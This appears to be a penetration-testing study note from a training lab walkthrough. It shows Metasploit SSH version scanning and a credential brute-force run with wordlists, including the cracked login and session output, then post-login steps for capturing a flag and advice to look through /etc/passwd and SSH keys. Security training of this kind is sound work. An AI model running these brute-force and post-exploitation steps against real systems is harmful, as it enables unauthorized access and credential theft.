# 🔐 Metasploit - SSH Enumeration Modules

This file explains useful **Metasploit auxiliary modules** for SSH service enumeration.

---

## 📂 Path in GitHub Project
```
service-enumeration/ssh/metasploit.md
```

---

## 🎯 Purpose
These modules help you:
- Identify SSH version and banner information
- Gather supported algorithms (KEX, ciphers, MACs, host keys)
- Enumerate SSH users
- Test SSH login with credentials
- Manage active SSH sessions after login

---

# 1️⃣ SSH Version Enumeration

### 🛠 Module
```
auxiliary/scanner/ssh/ssh_version
```

### 🚀 How to Use
```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
run
```

### ✅ Example Output (INE Lab)
```
[*] 192.61.134.3 - Key Fingerprint: ssh-ed25519 AAAAC3Nza...
[*] 192.61.134.3 - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10
[*] 192.61.134.3 - Server Information and Encryption
  encryption.encryption    aes128-ctr, aes256-gcm@openssh.com, ...
  encryption.hmac          hmac-sha2-256, hmac-sha2-512, ...
  encryption.host_key      ssh-ed25519, rsa-sha2-256, ecdsa-sha2-nistp256 (weak)
  os.vendor                Ubuntu
  os.version               19.04
  service.product          OpenSSH
  service.version          7.9p1
```

### 🔎 What it tells us
- OpenSSH 7.9p1 running on Ubuntu 19.04  
- Supported algorithms for key exchange, ciphers, MACs, host keys  
- OS hints from banner and CPE strings  

---

# 2️⃣ SSH Login Brute Force

### 🛠 Module
```
auxiliary/scanner/ssh/ssh_login
```

### 🚀 How to Use
```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
run
```

**Options used**
- `RHOSTS` → Target host(s)  
- `USER_FILE` → File with usernames  
- `PASS_FILE` → File with passwords  
- `STOP_ON_SUCCESS` → Stop once a valid login is found  
- `VERBOSE` → Show every attempt  

---

### ✅ Example Output (INE Lab)
```
[*] 192.61.134.3:22 - Starting bruteforce
[-] 192.61.134.3:22 - Failed: 'sysadmin:yourface'
[-] 192.61.134.3:22 - Failed: 'sysadmin:tolkien'
[+] 192.61.134.3:22 - Success: 'sysadmin:hailey' 
'uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin) Linux demo.ine.local 6.8.0-1012-aws #13-Ubuntu SMP Mon Jul 15 13:40:27 UTC 2024 x86_64 GNU/Linux'
[*] SSH session 1 opened (192.61.134.2:42819 -> 192.61.134.3:22)
```

---

### 🔎 What it tells us
- After many failed attempts, the module found **valid credentials**:
  - **Username**: `sysadmin`
  - **Password**: `hailey`
- It opened a working **SSH session** to the target.  
- The banner shows OS details: Ubuntu Linux kernel 6.8.0-1012-aws.

---

### ⚠️ Notes
- This is a **brute force attack** → only use with permission.  
- Can generate lots of noise in logs (easily detected).  
- Best used with **custom wordlists** or **specific usernames** from earlier enumeration.  

---

### ➡️ Next Steps
- Interact with the session:
  ```bash
  sessions -i 1
  ```
- Run post-exploitation modules (info gathering, privilege escalation, etc.).  
- Document the **credentials found** in your report.  

---

# 3️⃣ Managing SSH Sessions

After the `ssh_login` module succeeds, Metasploit opens an SSH session with the target.

### 🛠 Useful Commands

- List active sessions:
```bash
sessions
```
**Example Output**
```
Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH root @   192.61.134.2:42819 -> 192.61.134.3:22 (192.61.134.3)
```

- Interact with a session:
```bash
sessions -i 1
```

- Run Linux commands inside the session:
```bash
whoami
```
**Output**
```
sysadmin
```

---

### 🔎 Searching for Files

You can use Linux commands to search inside the compromised machine.

```bash
find / -name "flag"
```

**Example Output**
```
find: '/root': Permission denied
find: '/etc/ssl/private': Permission denied
/flag
```

The command found a file at `/flag`.

---

### 📄 Reading the Flag

```bash
cat /flag
```
**Output**
```
eb09cc6f1cd72756da145892892fbf5a
```

This is the **flag value** captured during the lab.

---

### ⚠️ Notes
- Many **Permission denied** errors are normal when running `find` as a non-root user.  
- Focus on the **successful matches** (like `/flag`).  
- Always document the path and content of important files (evidence).  

---

### ➡️ Next Steps
- Explore the filesystem for sensitive files (`/etc/passwd`, config files, SSH keys).  
- Enumerate system info:  
  ```bash
  uname -a
  id
  ```
- Check for privilege escalation opportunities.  

---

## 📝 Reporting Tips
- Record **SSH version** and **banner**
- List supported **algorithms** (weak/legacy ones like `ssh-rsa` or `diffie-hellman-group14-sha1`)
- Note OS info if available (Ubuntu version, etc.)
- Highlight outdated versions or weak algorithms in the report
- Save logs and screenshots as evidence
- Capture important findings (like flags or credentials)

---

## ➡️ Final Workflow
1. **Port scan** to find 22/tcp  
2. **ssh_version** → Identify SSH version + algorithms  
3. **ssh_enumusers** → Check usernames (optional, add later)  
4. **ssh_login** → Brute force login with wordlists  
5. **sessions** → Interact with the target system  
6. **Post-exploitation** → Collect flags, escalate privileges, report findings  
